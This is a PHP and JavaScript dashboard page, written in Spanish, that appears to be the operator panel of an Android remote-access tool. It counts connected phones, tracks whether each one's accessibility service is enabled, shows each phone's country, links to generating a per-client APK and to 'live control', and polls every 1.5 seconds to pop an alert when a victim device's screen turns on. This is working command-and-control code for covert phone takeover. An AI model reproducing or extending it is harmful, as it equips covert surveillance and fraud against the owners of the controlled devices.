<?php
require 'includes/session_check.php';
require 'includes/backend.php';

$result = backend_request('GET', '/api/hosts', null, $_SESSION['owner_token']);
$hosts = ($result['status'] === 200 && is_array($result['body'])) ? $result['body'] : [];

// Métricas del resumen.
$total = count($hosts);
$active = 0;
$screenOn = 0;
$countries = [];
foreach ($hosts as $h) {
    if (!empty($h['accessibilityEnabled'])) { $active++; }
    if (!empty($h['screenOn'])) { $screenOn++; }
    $cc = strtoupper(trim((string)($h['countryCode'] ?? '')));
    if ($cc !== '') { $countries[$cc] = true; }
}
$countryCount = count($countries);

// Hosts ya conectados al cargar: sirven de base para no lanzar alertas de los que ya estaban.
$initialOnline = [];
// Pantallas ya encendidas al cargar: base para no alertar por las que ya estaban encendidas.
$initialScreenOn = [];
foreach ($hosts as $h) {
    if (!empty($h['online'])) { $initialOnline[] = $h['hostId']; }
    if (!empty($h['screenOn'])) { $initialScreenOn[] = $h['hostId']; }
}

function flag_src($cc) {
    $cc = strtolower(trim((string) $cc));
    return (strlen($cc) === 2) ? "https://flagcdn.com/24x18/$cc.png" : '';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mi cuenta - ACCES</title>
    <link rel="icon" type="image/png" href="img/favicon.png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/style.css?v=<?= @filemtime(__DIR__ . '/assets/css/style.css') ?>">
</head>
<body>
    <?php require 'includes/bg_decor.php'; ?>
    <?php require 'includes/top_menu.php'; ?>
    <div class="toast-wrap" id="toastWrap"></div>
    <div class="page-content">
        <div class="dash-head">
            <div>
                <h2>Bienvenido, <?= htmlspecialchars($_SESSION['usuario_nombre']) ?></h2>
                <p class="dash-sub">Centro de mando de tu cuenta. Resumen en vivo </p>
            </div>
            <span class="hosts-count"><span class="hosts-count__dot"></span>En vivo</span>
        </div>

        <div class="dash-stats">
            <div class="stat-card">
                <span class="stat-card__icon">▦</span>
                <div class="stat-card__value" id="statTotal"><?= $total ?></div>
                <div class="stat-card__label">Dispositivos</div>
            </div>
            <div class="stat-card">
                <span class="stat-card__icon">⚡</span>
                <div class="stat-card__value" id="statActive"><?= $active ?></div>
                <div class="stat-card__label">Activos ahora</div>
            </div>
            <div class="stat-card">
                <span class="stat-card__icon">📱</span>
                <div class="stat-card__value" id="statScreen"><?= $screenOn ?></div>
                <div class="stat-card__label">Pantalla encendida</div>
            </div>
            <div class="stat-card">
                <span class="stat-card__icon">🌐</span>
                <div class="stat-card__value" id="statCountries"><?= $countryCount ?></div>
                <div class="stat-card__label">Países</div>
            </div>
        </div>

        <div class="health-panel">
            <div class="health-top">
                <div class="health-main">
                    <span class="health-dot" id="healthDot"></span>
                    <div>
                        <div class="health-status" id="healthStatus">Comprobando…</div>
                        <div class="health-meta">
                            Estado del servidor
                            <img class="host-flag-img" id="hmCountryFlag" alt="" src="" hidden>
                            <span id="hmCountry"></span>
                        </div>
                    </div>
                </div>
                <div class="health-bars" id="healthBars"></div>
            </div>
            <div class="health-grid">
                <div class="hm"><span class="hm__v" id="hmLatency">—</span><span class="hm__l">Latencia</span></div>
                <div class="hm"><span class="hm__v" id="hmAvail">—</span><span class="hm__l">Disponibilidad</span></div>
                <div class="hm"><span class="hm__v" id="hmUptime">—</span><span class="hm__l">Uptime</span></div>
                <div class="hm"><span class="hm__v" id="hmMem">—</span><span class="hm__l">Memoria (RSS)</span></div>
                <div class="hm"><span class="hm__v" id="hmLoad">—</span><span class="hm__l">Carga (1&nbsp;min)</span></div>
                <div class="hm"><span class="hm__v" id="hmCpus">—</span><span class="hm__l">CPUs</span></div>
                <div class="hm"><span class="hm__v" id="hmNode">—</span><span class="hm__l">Node</span></div>
            </div>
        </div>

        <div class="dash-actions">
            <a href="conectar.php" class="action-card">
                <span class="action-card__icon">＋</span>
                <span>
                    <span class="action-card__title">Conectar</span>
                    <span class="action-card__desc">Genera un APK para un nuevo cliente</span>
                </span>
            </a>
            <a href="ver.php" class="action-card">
                <span class="action-card__icon">▤</span>
                <span>
                    <span class="action-card__title">Ver dispositivos</span>
                    <span class="action-card__desc">Lista completa y control en vivo</span>
                </span>
            </a>
        </div>

        <div class="activity-panel">
            <div class="activity-head">
                <h3>Actividad reciente</h3>
                <a href="ver.php" class="activity-head__link">Ver todos →</a>
            </div>
            <ul class="activity-list" id="activityList">
                <?php if (empty($hosts)): ?>
                    <li class="activity-empty">Todavía no hay dispositivos. Genera una app desde "Conectar".</li>
                <?php else: ?>
                    <?php foreach (array_slice($hosts, 0, 6) as $h): ?>
                        <?php $fsrc = flag_src($h['countryCode'] ?? null); ?>
                        <li class="activity-item" data-host-id="<?= htmlspecialchars($h['hostId']) ?>">
                            <img class="activity-item__flag" alt="<?= htmlspecialchars(strtoupper($h['countryCode'] ?? '')) ?>"
                                 src="<?= htmlspecialchars($fsrc) ?>" <?= $fsrc ? '' : 'hidden' ?>>
                            <span class="activity-item__main">
                                <span class="activity-item__name"><?= htmlspecialchars($h['friendlyName']) ?></span>
                                <span class="activity-item__sub"><?= htmlspecialchars($h['appName'] ?: ($h['deviceModel'] ?: '—')) ?></span>
                            </span>
                            <span class="act-status <?= !empty($h['accessibilityEnabled']) ? 'act-status--on' : 'act-status--off' ?>">
                                <?= !empty($h['accessibilityEnabled']) ? 'Activo' : 'Inactivo' ?>
                            </span>
                            <a class="activity-item__go" href="host.php?host=<?= urlencode($h['hostId']) ?>">Abrir</a>
                        </li>
                    <?php endforeach; ?>
                <?php endif; ?>
            </ul>
        </div>
    </div>

    <script>
        const BACKEND_BASE_URL = <?= json_encode(BACKEND_BASE_URL) ?>;
        const OWNER_TOKEN = <?= json_encode($_SESSION['owner_token']) ?>;
        const INITIAL_ONLINE = <?= json_encode($initialOnline) ?>;
        const INITIAL_SCREEN_ON = <?= json_encode($initialScreenOn) ?>;
        let prevOnline = new Set(INITIAL_ONLINE);
        let prevScreenOn = new Set(INITIAL_SCREEN_ON);

        function flagSrc(cc) {
            cc = (cc || '').toLowerCase();
            return cc.length === 2 ? `https://flagcdn.com/24x18/${cc}.png` : '';
        }
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text == null ? '' : text;
            return div.innerHTML;
        }

        async function refreshDashboard() {
            try {
                const res = await fetch(`${BACKEND_BASE_URL}/api/hosts`, {
                    headers: { 'Authorization': `Bearer ${OWNER_TOKEN}` },
                });
                if (!res.ok) return;
                const hosts = await res.json();
                if (!Array.isArray(hosts)) return;

                // Alerta: salta apenas se ENCIENDE la pantalla de un host (transición
                // apagada -> encendida). La pantalla encendida sí se detecta de forma fiable,
                // a diferencia del estado "conectado" que casi no cambia una vez enlazado.
                const screenOnSet = new Set(hosts.filter(h => h.screenOn).map(h => h.hostId));
                hosts.forEach(h => { if (h.screenOn && !prevScreenOn.has(h.hostId)) notifyScreenOn(h); });
                prevScreenOn = screenOnSet;
                // Se mantiene el seguimiento de conectados para la base, sin alertar por él.
                prevOnline = new Set(hosts.filter(h => h.online).map(h => h.hostId));

                const total = hosts.length;
                const active = hosts.filter(h => h.accessibilityEnabled).length;
                const screen = hosts.filter(h => h.screenOn).length;
                const countries = new Set(hosts.map(h => (h.countryCode || '').toUpperCase()).filter(Boolean)).size;

                document.getElementById('statTotal').textContent = total;
                document.getElementById('statActive').textContent = active;
                document.getElementById('statScreen').textContent = screen;
                document.getElementById('statCountries').textContent = countries;

                const list = document.getElementById('activityList');
                if (!total) {
                    list.innerHTML = '<li class="activity-empty">Todavía no hay dispositivos. Genera una app desde "Conectar".</li>';
                    return;
                }
                list.innerHTML = hosts.slice(0, 6).map(h => {
                    const src = flagSrc(h.countryCode);
                    const on = !!h.accessibilityEnabled;
                    const sub = h.appName || h.deviceModel || '—';
                    return `
                        <li class="activity-item" data-host-id="${escapeHtml(h.hostId)}">
                            <img class="activity-item__flag" alt="${escapeHtml((h.countryCode || '').toUpperCase())}"
                                 src="${escapeHtml(src)}" ${src ? '' : 'hidden'}>
                            <span class="activity-item__main">
                                <span class="activity-item__name">${escapeHtml(h.friendlyName)}</span>
                                <span class="activity-item__sub">${escapeHtml(sub)}</span>
                            </span>
                            <span class="act-status ${on ? 'act-status--on' : 'act-status--off'}">${on ? 'Activo' : 'Inactivo'}</span>
                            <a class="activity-item__go" href="host.php?host=${encodeURIComponent(h.hostId)}">Abrir</a>
                        </li>`;
                }).join('');
            } catch {
                /* reintenta en el próximo ciclo */
            }
        }

        // ---- Alerta emergente cuando se enciende la pantalla de un host ----
        function notifyScreenOn(h) {
            const wrap = document.getElementById('toastWrap');
            if (!wrap) return;
            const src = flagSrc(h.countryCode);
            const toast = document.createElement('a');
            toast.className = 'toast';
            toast.href = `host.php?host=${encodeURIComponent(h.hostId)}`;
            const meta = h.appName || h.deviceModel || '';
            const cc = (h.countryCode || '').toUpperCase();
            toast.innerHTML = `
                <span class="toast__icon">📱</span>
                <span class="toast__body">
                    <span class="toast__title">Pantalla encendida</span>
                    <span class="toast__name">${escapeHtml(h.friendlyName)}</span>
                    <span class="toast__meta">
                        ${src ? `<img class="toast__flag" src="${escapeHtml(src)}" alt="${escapeHtml(cc)}">` : ''}
                        ${cc ? `<span class="toast__cc">${escapeHtml(cc)}</span>` : ''}
                        ${meta ? `<span class="toast__app">${escapeHtml(meta)}</span>` : ''}
                    </span>
                </span>
                <span class="toast__close" aria-hidden="true">✕</span>`;
            function dismiss() { toast.classList.add('is-out'); setTimeout(() => toast.remove(), 300); }
            toast.querySelector('.toast__close').addEventListener('click', (e) => { e.preventDefault(); dismiss(); });
            wrap.appendChild(toast);
            setTimeout(dismiss, 8000);
        }

        // ---- Monitor de salud del servidor ----
        let latHistory = [];

        function fmtUptime(s) {
            s = Math.floor(s);
            const d = Math.floor(s / 86400); s -= d * 86400;
            const h = Math.floor(s / 3600);  s -= h * 3600;
            const m = Math.floor(s / 60);
            if (d) return `${d}d ${h}h ${m}m`;
            if (h) return `${h}h ${m}m`;
            return `${m}m`;
        }
        function fmtBytes(b) {
            if (!b && b !== 0) return '—';
            const mb = b / (1024 * 1024);
            return mb >= 1024 ? (mb / 1024).toFixed(2) + ' GB' : Math.round(mb) + ' MB';
        }
        function setMetric(id, val) {
            const el = document.getElementById(id);
            if (el) el.textContent = val;
        }

        async function pingServer() {
            const dot = document.getElementById('healthDot');
            const status = document.getElementById('healthStatus');
            const t0 = performance.now();
            let ok = false, lat = null, data = null;
            try {
                const res = await fetch(`${BACKEND_BASE_URL}/api/health`, { cache: 'no-store' });
                ok = res.ok;
                lat = Math.round(performance.now() - t0);
                if (ok) { try { data = await res.json(); } catch (e) {} }
            } catch (e) { ok = false; }

            if (ok) {
                dot.className = 'health-dot is-up';
                status.textContent = 'Operativo';
                status.className = 'health-status is-up';
                latHistory.push({ lat, fail: false });
            } else {
                dot.className = 'health-dot is-down';
                status.textContent = 'Caído';
                status.className = 'health-status is-down';
                latHistory.push({ lat: null, fail: true });
            }
            if (latHistory.length > 24) latHistory.shift();
            renderBars();

            // Métricas medidas por el cliente (siempre disponibles).
            const oks = latHistory.filter(b => !b.fail);
            const avail = latHistory.length ? Math.round((oks.length / latHistory.length) * 100) : 0;
            setMetric('hmAvail', avail + '%');
            if (oks.length) {
                const ls = oks.map(b => b.lat);
                const avg = Math.round(ls.reduce((a, c) => a + c, 0) / ls.length);
                setMetric('hmLatency', (ok ? lat : avg) + ' ms');
            } else {
                setMetric('hmLatency', 'sin respuesta');
            }

            // Métricas que reporta el servidor (aparecen tras desplegar el nuevo endpoint).
            if (data) {
                setMetric('hmUptime', data.uptime != null ? fmtUptime(data.uptime) : '—');
                setMetric('hmMem', data.memory ? fmtBytes(data.memory.rss) : '—');
                setMetric('hmLoad', data.system && data.system.loadavg ? data.system.loadavg[0].toFixed(2) : '—');
                setMetric('hmCpus', data.system && data.system.cpus != null ? data.system.cpus : '—');
                setMetric('hmNode', data.node || '—');

                // Banderita del país donde está el servidor.
                const flag = document.getElementById('hmCountryFlag');
                const lbl = document.getElementById('hmCountry');
                const cc = (data.country || '').toLowerCase();
                if (cc.length === 2) {
                    flag.src = `https://flagcdn.com/24x18/${cc}.png`;
                    flag.alt = cc.toUpperCase();
                    flag.hidden = false;
                    lbl.textContent = cc.toUpperCase();
                } else {
                    flag.hidden = true;
                    lbl.textContent = '';
                }
            }
        }
        function renderBars() {
            const bars = document.getElementById('healthBars');
            bars.innerHTML = latHistory.map(b => {
                let cls = 'ok', h = 22;
                if (b.fail) { cls = 'fail'; h = 100; }
                else if (b.lat > 700) { cls = 'slow'; h = 90; }
                else if (b.lat > 250) { cls = 'mid'; h = 55; }
                else { h = Math.max(22, Math.round((b.lat / 250) * 45)); }
                return `<span class="health-bar health-bar--${cls}" style="height:${h}%"></span>`;
            }).join('');
        }

        refreshDashboard();
        pingServer();
        // Sondeo rápido para que la alerta de pantalla encendida salte casi al instante.
        setInterval(refreshDashboard, 1500);
        setInterval(pingServer, 5000);
    </script>
</body>
</html>
